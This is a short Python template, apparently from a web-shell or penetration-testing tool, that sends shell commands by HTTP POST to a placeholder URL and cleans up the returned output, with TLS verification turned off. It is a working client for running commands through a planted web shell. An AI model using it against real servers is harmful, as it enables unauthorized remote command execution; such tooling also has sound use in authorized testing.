# Buit-in imports
import re

# Third party library imports
import httpx


def execute(command: str, timeout: float = None) -> str:
    response = httpx.post(
        url="||URL||",
        data={
            "||PARAM_CMD||": command,
            # ||PARAMS||
        },
        # ||BURP||
        timeout=timeout,
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    # Trying to sanitize most of the webshells outputs
    output = response.text

    # Check if entire output consists only of escape sequences
    if re.fullmatch(r"(\\[nt]|[\n\t])+", output, flags=re.IGNORECASE):
        return ""

    # If there's meaningful content, strip only the trailing escape sequences
    output = re.sub(r"(\\[nt]|[\n\t])+$", "", output, flags=re.IGNORECASE)

    return output
